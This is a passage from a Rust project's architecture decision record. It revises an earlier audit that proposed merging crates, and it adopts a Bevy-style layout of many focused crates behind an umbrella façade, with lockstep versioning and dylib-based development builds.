- **DA-7** — fold `credential-vault` into `credential-builtin`
  feature `vault`.
- **DA-8** — schema-triad: schedule honest vote (ALT-D vs 3
  siblings), no default winner.
- **DA-9** — façade audit: confirm `nebula-sdk` fully hides internal
  layout so aggressive merge is user-invisible (Alice Ryhl gate).

---

*Decomposition audit complete — but see the Bevy-path correction
below, which supersedes most of its merge proposals.*

---

## Bevy-path Correction (2026-05-15)

> User: «я согласен что много крейтов, но я шёл по пути bevy» — and
> later flagged Bevy's special crates (`bevy_internal`,
> `bevy_dylib`, …). The full-decomposition audit was one-sided
> (consolidation school, Lucio Franco / tonic=3). Cart (Bevy
> creator) was on the panel the whole session and was never given
> the floor to defend the many-focused-crates + umbrella philosophy.
> First the panel echo-validated, then it echo-cut — both biased.
> This correction gives the Bevy voice and rewrites the audit's
> conclusions.

### Bevy-path is a deliberate strength, not crate debt

Cart's four conditions that make many crates a strength:
1. **Umbrella façade** — user writes `nebula-sdk = "x"`; features
   re-export; internal split invisible.
2. **Single-version lockstep** — all `nebula-*` ship one version
   together; semver hell (Aaron Turon's worry) solved by policy.
3. **Each crate focused + standalone** — one clear responsibility;
   usable on its own (`bevy_ecs` precedent).
4. **Parallel compilation** — many small crates compile *faster*
   than a monolith (direct counter to Cantrill's "26 = slow
   release": cold build is parallel; iteration solved by dylib
   below).

Tokio (`tokio` + `tokio-util` + `tokio-stream` + umbrella) and Bevy
(~40 crates + `bevy`) both prove the umbrella path at scale.

### Most audit merges RETRACTED

| Earlier audit proposal | Verdict now (Bevy-path) |
|---|---|
| plugin/sandbox → engine | **Retracted** — fine as focused crates |
| workflow + execution merge | **Retracted** — focused crates ok |
| log+metrics+system → observability | **Retracted** — Bevy keeps `bevy_log`/`bevy_diagnostic` separate; ok |
| credential-vault → builtin feature | **Retracted** — focused crate ok |
| core + error merge | **Retracted** — focused ok |
| schema+validator+expression (ALT-D) | **Retracted as a merge** — three focused siblings is Bevy-valid; the earlier "OPEN vote" is resolved toward keep-separate |

### What survives even by Bevy discipline

Bevy discipline has teeth — one crate = one responsibility, no
junk-common, no crate-from-one-test, split the bloated:

- **Kill `nebula-metadata`** — Bevy has no `bevy_common` junk crate;
  `bevy_utils`/`bevy_core` are focused. metadata = "shared header
  for three crates" is exactly the anti-pattern Bevy avoids.
  `CatalogLeaf` trait → `core`; compat rules → `schema` (Schema
  Immutability's home). (Cart + matklad — anti-Bevy, not
  "merge-for-fewer".)
- **`storage-loom-probe` → not a crate** — Bevy makes no crate from
  one test; → `storage/tests/` cfg(loom).
- **Split bloated `nebula-credential`** — 70 files, ~7
  responsibilities — anti-Bevy the *other* direction. Bevy would
  **split** it (= Round 2-B), not merge it. A bloated crate is as
  un-Bevy as a junk-common crate.

### Bevy service crates Nebula must adopt

Many-crate without these *hurts* — they are Bevy discipline, not
bloat:

| Crate | Role | Bevy analog |
|---|---|---|
| `nebula-sdk` | thin **stable user face** (near-empty re-export) | `bevy` |
| `nebula-internal` | all feature-wiring of the N crates, free to churn | `bevy_internal` |
| `nebula-dylib` | dynamic linking, `dynamic_linking` feature, dev-only — fast plugin-author iteration | `bevy_dylib` |
| `nebula-macro-utils` | shared proc-macro kitchen — **already exists** as `crates/sdk/macros-support`; rename + use everywhere | `bevy_macro_utils` |
| ~~reflect~~ | NOT needed — `nebula-schema` covers UI shape; full runtime reflect only with the (long-term) visual editor | `bevy_reflect` (deferred) |

Two-layer façade (thin `sdk` + churny `internal`) = Hyrum control
(dtolnay). `nebula-dylib` = the actual answer to "many crates slow
dev" — cold build parallel, iteration dynamically linked
(matklad/Alice Ryhl: dev-iteration time decides whether anyone
contributes; Carl Lerche caveat: measure cold/incremental before
declaring dylib mandatory, like the Round 1 stdlib benchmark).

### Net position

The decomposition is **NOT over-split**. Many focused crates is the
user's deliberate, proven (Bevy/Tokio) choice. The fix is
**discipline, not count**:
1. one crate = one responsibility → split bloated `credential`
   (Round 2-B stands), kill `metadata` junk-common, `loom-probe`
   → tests;
2. two-layer façade `nebula-sdk` (thin) + `nebula-internal`
   (wiring);
3. `nebula-dylib` for dev-iteration speed (measure first);
4. single-version lockstep release policy (Cantrill's condition);
5. `nebula-macro-utils` = existing `sdk/macros-support`, formalized.

The "26 → 13" merge program is withdrawn. Crate count stays roughly
as-is (minus `metadata`, minus `loom-probe`-as-crate, plus
`nebula-internal` + `nebula-dylib`); the work is Bevy-discipline +
the Round 2-B credential split.

### Charter / ADR impact

- **ADR-0075 rewritten** — from "consolidate 26→13" to "Bevy-path
  discipline": umbrella + lockstep + focused-crate rule + service
  crates (`internal`/`dylib`/`macro-utils`).
- **New Charter principle — Bevy-path many-crate discipline**: many
  focused crates are endorsed *iff* (a) two-layer umbrella hides
  split, (b) single-version lockstep, (c) one-crate-one-
  responsibility (bloated split, junk-common killed), (d)
  `dynamic_linking` for dev iteration.
- ALT-A/B/E (phase decomposition, core+opt-in, drop-traits) —
  **set aside**; user has chosen the Bevy model deliberately. They
  remain on record as roads not taken, not as pending votes.
- Retained from audit: kill `metadata` (DA-2), `loom-probe`→tests
  (DA-3), Round 2-B credential split.
- Retracted from audit: DA-4/5/6/7 (plugin/sandbox/observability/
  vault merges), DA-8 (schema-triad vote — resolved keep-separate).

### Action items

- **DB-1** — ADR-0075 rewrite: Bevy-path discipline (umbrella +
  lockstep + focused rule + service crates), supersedes the
  consolidation map.
- **DB-2** — `nebula-internal` introduced; `nebula-sdk` slimmed to
  thin stable face (two-layer façade, Bevy `bevy`/`bevy_internal`).
- **DB-3** — `nebula-dylib` (`dynamic_linking` dev feature) +
  cold/incremental compile benchmark gating "mandatory" claim
  (Carl Lerche).
- **DB-4** — `crates/sdk/macros-support` → `nebula-macro-utils`,
  used by every `*/macros`.
- **DB-5** — single-version lockstep release policy documented
  (Cantrill condition); all `nebula-*` one version, synchronized.
- **DB-6** — keep DA-2 (kill metadata → CatalogLeaf in core, compat
  in schema), DA-3 (loom-probe → tests), Round 2-B (split
  credential). Drop DA-4/5/6/7/8.

---

*Bevy-path adopted. Synthesis / Charter rewrite pending user
direction.*
